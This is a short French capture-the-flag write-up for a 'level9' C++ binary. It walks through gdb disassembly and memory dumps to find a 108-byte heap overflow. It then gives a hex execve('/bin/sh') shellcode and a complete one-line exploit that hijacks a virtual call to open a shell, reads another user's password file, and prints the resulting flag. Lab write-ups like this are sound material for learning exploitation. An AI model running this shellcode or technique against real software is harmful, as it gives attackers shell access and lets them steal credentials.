Dans ce niveau l'excutable appelle des fonctions et des classes en c++ notamment avec `new()`

On va voir ou est stoke l'arg avec un break apres `N::setAnnotation(char*)` donc a `0x0804867c`
```sh
0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax
   0x08048680 <+140>:	mov    (%eax),%eax
   0x08048682 <+142>:	mov    (%eax),%edx
   0x08048684 <+144>:	mov    0x14(%esp),%eax
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx
   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:	leave  
   0x08048699 <+165>:	ret
```
En essayant avec des "AAAAAAAA" on voit ou ils sont stoke :
```sh
Breakpoint 1, 0x0804867c in main ()
(gdb) x/30wx $eax
0x804a00c:	0x41414141	0x41414141	0x00000000	0x00000000
0x804a01c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a02c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a03c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a04c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a05c:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a06c:	0x00000000	0x00000005	0x00000071	0x08048848
0x804a07c:	0x00000000	0x00000000
```

On voit donc qu'on va overflow au bout de 108 char

On va chercher a injecter un shellcode a la premiere adresse ou c'est stocke `0x804a00c + 4 = 134520848 = 0x0804A010`

Le shellcode : `execve("/bin/sh")` = `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80`

Et avec l'overflow on va placer l'adresse du debut d'$eax : `0x804a00c`

On va donc passer le script suivant ("A" * 76 car : `112(total $eax) - 4(premiere adresse) - 28(shellcode) - 4(deuxieme adresse) = 76`) :

`./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')`

Quand le programme s'execute un shell s'ouvre on peut donc utiliser `cat /home/user/bonus0/.pass` et le flag sort :

`f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`